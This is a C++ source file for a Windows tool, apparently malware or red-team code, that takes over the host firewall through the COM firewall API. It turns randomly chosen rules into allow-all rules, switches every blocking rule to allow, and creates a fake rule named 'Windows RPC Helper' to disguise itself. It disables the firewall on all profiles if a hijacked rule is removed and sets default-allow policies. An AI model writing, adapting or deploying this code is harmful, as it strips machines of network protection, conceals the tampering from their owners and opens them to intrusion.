#include "stdafx.h"
#include "Firewall.h"

using namespace std;

Firewall::Firewall(){
	handleStatus = S_OK;
	firewallPolicy = NULL;
	hijackedIn = NULL;
	hijackedOut = NULL;
	ruleSet = NULL;
	long ruleCount = 0;

	//Get COM bject
	handleStatus = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	if (FAILED(handleStatus)){
		cout << "COM Failed to initialize\n";
	}

	//get firewall policy
	handleStatus = CoCreateInstance(__uuidof(NetFwPolicy2), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (void**)&firewallPolicy);
	if (FAILED(handleStatus)){
		cout << "FW Policy failed to initialize.\n";
	}
}

Firewall::~Firewall(){
	//clear out vectors, release rules, rulesets, and the policy, uninitialize COM
	inRules.clear();
	outRules.clear();
	if (hijackedIn != NULL)
		hijackedIn->Release();
	if (hijackedOut != NULL)
	hijackedOut->Release();
	if (ruleSet != NULL)
		ruleSet->Release();
	if (firewallPolicy != NULL)
		firewallPolicy->Release();
	CoUninitialize();
}

void Firewall::populate_ruleSet(){
	inRules.clear();
	outRules.clear();
	handleStatus = firewallPolicy->get_Rules(&ruleSet);
	handleStatus = ruleSet->get_Count(&ruleCount);
	IUnknown* enumerator;
	IEnumVARIANT* iterator;
	CComVariant var;
	INetFwRule* pFwRule = NULL;

	//get all rules (magic from the microsoft site)
	ruleSet->get__NewEnum(&enumerator);
	enumerator->QueryInterface(__uuidof(IEnumVARIANT), (void**)&iterator);
	while (SUCCEEDED(handleStatus) && handleStatus != S_FALSE)
	{
		var.Clear();
		handleStatus = iterator->Next(1, &var, NULL);

		if (S_FALSE != handleStatus)
		{
			if (SUCCEEDED(handleStatus))
			{
				handleStatus = var.ChangeType(VT_DISPATCH);
			}
			if (SUCCEEDED(handleStatus))
			{
				handleStatus = (V_DISPATCH(&var))->QueryInterface(__uuidof(INetFwRule), reinterpret_cast<void**>(&pFwRule));
			}

			if (SUCCEEDED(handleStatus))
			{
				//add them to in and out vectors
				NET_FW_RULE_DIRECTION dir;
				pFwRule->get_Direction(&dir);
				switch (dir){
					case NET_FW_RULE_DIR_IN:
						inRules.push_back(pFwRule);
						break;
					case NET_FW_RULE_DIR_OUT:
						outRules.push_back(pFwRule);
						break;
					default:
						break;
				}
			}
		}
	}
}

void Firewall::ownFirewall(){
	//run a bunch of functions to kill the firewall
	//firewallOff();
	//setDefaultAllowPolicy();
	replaceRule(get_randomRule("in"));
	replaceRule(get_randomRule("out"));
	blockToAllow();
}



INetFwRule* Firewall::get_randomRule(string dir){
	//pick a random rule based on in or out argument 
	populate_ruleSet();
	int ruleNum = 0;
	if (dir == "in" && inRules.size() != 0){
		ruleNum = rand() % inRules.size();
		return inRules[ruleNum];
	}
	else if (dir == "out" && outRules.size() != 0){
		ruleNum = rand() % outRules.size();
		return outRules[ruleNum];
	}
	return NULL;
}

BOOL Firewall::hasRule(BSTR name, NET_FW_RULE_DIRECTION dir){
	BSTR chk;
	vector<INetFwRule*>* set;
	if (dir == NET_FW_RULE_DIR_IN)
		set = &inRules;
	else
		set = &outRules;
	for (vector<INetFwRule*>::iterator rule = set->begin(); rule != set->end(); rule++){
		(*rule)->get_Name(&chk);
		if (!wcscmp(name, chk))
			return TRUE;
	}
	return FALSE;
}

void Firewall::updateReplacedRules(){
	BSTR tmp;
	if (hijackedIn != NULL){
		hijackedIn->get_Name(&tmp);
		hijackedIn->put_Action(NET_FW_ACTION_ALLOW);
		hijackedIn->put_Enabled(VARIANT_TRUE);
		hijackedIn->put_Direction(NET_FW_RULE_DIR_IN);
		hijackedIn->put_LocalAddresses(L"");
		hijackedIn->put_ApplicationName(L"");
		hijackedIn->put_LocalPorts(L"");
		hijackedIn->put_Profiles(NET_FW_PROFILE2_ALL);
		hijackedIn->put_RemoteAddresses(L"");
		hijackedIn->put_RemotePorts(L"");
		hijackedIn->put_ServiceName(L"");
		hijackedIn->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
		if (!hasRule(tmp, NET_FW_RULE_DIR_IN)){
			firewallOff();
		}
	}
	if (hijackedOut != NULL){
		hijackedOut->get_Name(&tmp);
		hijackedOut->put_Action(NET_FW_ACTION_ALLOW);
		hijackedOut->put_Enabled(VARIANT_TRUE);
		hijackedOut->put_Direction(NET_FW_RULE_DIR_OUT);
		hijackedOut->put_LocalAddresses(L"");
		hijackedOut->put_ApplicationName(L"");
		hijackedOut->put_LocalPorts(L"");
		hijackedOut->put_Profiles(NET_FW_PROFILE2_ALL);
		hijackedOut->put_RemoteAddresses(L"");
		hijackedOut->put_RemotePorts(L"");
		hijackedOut->put_ServiceName(L"");
		hijackedOut->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
		if (!hasRule(tmp, NET_FW_RULE_DIR_OUT)){
			firewallOff();
		}
	}
}

void Firewall::printHijackedRules(){
	BSTR tmp;
	hijackedIn->get_Name(&tmp);
	wcerr << "In rule: " << tmp << endl;
	hijackedOut->get_Name(&tmp);
	wcerr << "Out rule: " << tmp << endl;
}

void Firewall::replaceRule(INetFwRule* repRule){
	//Select random rule from in and out and make it mine :)
	BSTR ruleName = NULL;
	NET_FW_RULE_DIRECTION ruleDir;
	BSTR ruleDesc = NULL;
	INetFwRule* therule = NULL;


	//get the rule's name, description, and direction
	if (repRule != NULL){
		repRule->get_Direction(&ruleDir);
		repRule->get_Name(&ruleName);
		therule = repRule;
	}
	else{
		//if there are no rules just use this...
		ruleName = SysAllocString(L"Windows RPC Helper");
		ruleDesc = SysAllocString(L"Allows the Windows Remote Procedure Call Helper through the firewall.");
		handleStatus = CoCreateInstance(__uuidof(NetFwRule), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwRule), (void**)&therule);
		cout << "Handle: " << handleStatus << endl;
		therule->put_Action(NET_FW_ACTION_ALLOW);
		if (!hijackedIn)
			ruleDir = NET_FW_RULE_DIR_IN;
		if (!hijackedOut)
			ruleDir = NET_FW_RULE_DIR_OUT;
		therule->put_Direction(ruleDir);
		therule->put_Name(ruleName);
		therule->put_Description(ruleDesc);
		SysFreeString(ruleName);
		SysFreeString(ruleDesc);
		ruleSet->Add(therule);
	}
	if (ruleDir == NET_FW_RULE_DIR_IN){
		if (hijackedIn != NULL)
			hijackedIn->Release();
		hijackedIn = therule;
	}
	else if (ruleDir == NET_FW_RULE_DIR_OUT){
		if (hijackedOut != NULL)
			hijackedOut->Release();
		hijackedOut = therule;
	}
	
}

void Firewall::setDefaultAllowPolicy(){
	//Allow traffic for Public profile
	handleStatus = firewallPolicy->put_BlockAllInboundTraffic(NET_FW_PROFILE2_PUBLIC, FALSE);
	handleStatus = firewallPolicy->put_DefaultOutboundAction(NET_FW_PROFILE2_PUBLIC, NET_FW_ACTION_ALLOW);
	handleStatus = firewallPolicy->put_DefaultInboundAction(NET_FW_PROFILE2_PUBLIC, NET_FW_ACTION_ALLOW);

	//Allow traffic for Domain profile
	handleStatus = firewallPolicy->put_BlockAllInboundTraffic(NET_FW_PROFILE2_DOMAIN, FALSE);
	handleStatus = firewallPolicy->put_DefaultOutboundAction(NET_FW_PROFILE2_DOMAIN, NET_FW_ACTION_ALLOW);
	handleStatus = firewallPolicy->put_DefaultInboundAction(NET_FW_PROFILE2_DOMAIN, NET_FW_ACTION_ALLOW);

	//Allow traffic for Private profile
	handleStatus = firewallPolicy->put_BlockAllInboundTraffic(NET_FW_PROFILE2_PRIVATE, FALSE);
	handleStatus = firewallPolicy->put_DefaultOutboundAction(NET_FW_PROFILE2_PRIVATE, NET_FW_ACTION_ALLOW);
	handleStatus = firewallPolicy->put_DefaultInboundAction(NET_FW_PROFILE2_PRIVATE, NET_FW_ACTION_ALLOW);
}

void Firewall::firewallOff(){
	//Disable firewall for all profiles
	handleStatus = firewallPolicy->put_FirewallEnabled(NET_FW_PROFILE2_PUBLIC, FALSE);
	handleStatus = firewallPolicy->put_FirewallEnabled(NET_FW_PROFILE2_DOMAIN, FALSE);
	handleStatus = firewallPolicy->put_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, FALSE);
}

void Firewall::blockToAllow(){
	//loops through all rules in the policy, changes blocking rules to allow
	NET_FW_ACTION ruleAction;
	for (vector<INetFwRule*>::iterator rule = inRules.begin(); rule != inRules.end(); rule++){
		(*rule)->get_Action(&ruleAction);
		if (ruleAction == NET_FW_ACTION_BLOCK){
			(*rule)->put_Action(NET_FW_ACTION_ALLOW);
		}
	}
	for (vector<INetFwRule*>::iterator rule = outRules.begin(); rule != outRules.end(); rule++){
		(*rule)->get_Action(&ruleAction);
		if (ruleAction == NET_FW_ACTION_BLOCK){
			(*rule)->put_Action(NET_FW_ACTION_ALLOW);
		}
	}
}

HRESULT Firewall::get_handleStatus(){
	return handleStatus;
}

INetFwRules* Firewall::get_ruleSet(){
	return ruleSet;
}

INetFwPolicy2* Firewall::get_fwPolicy(){
	return firewallPolicy;
}

BOOL Firewall::firewallEnabled(){
	//returns TRUE if the firewall is enabled in any way, FALSE if it is not
	VARIANT_BOOL pub = VARIANT_FALSE;
	VARIANT_BOOL priv = VARIANT_FALSE;
	VARIANT_BOOL dom = VARIANT_FALSE;
	firewallPolicy->get_FirewallEnabled(NET_FW_PROFILE2_PUBLIC, &pub);
	firewallPolicy->get_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, &priv);
	firewallPolicy->get_FirewallEnabled(NET_FW_PROFILE2_DOMAIN, &dom);

	if (pub == VARIANT_TRUE || priv == VARIANT_TRUE || dom == VARIANT_TRUE){
		return TRUE;
	}
	return FALSE;
}
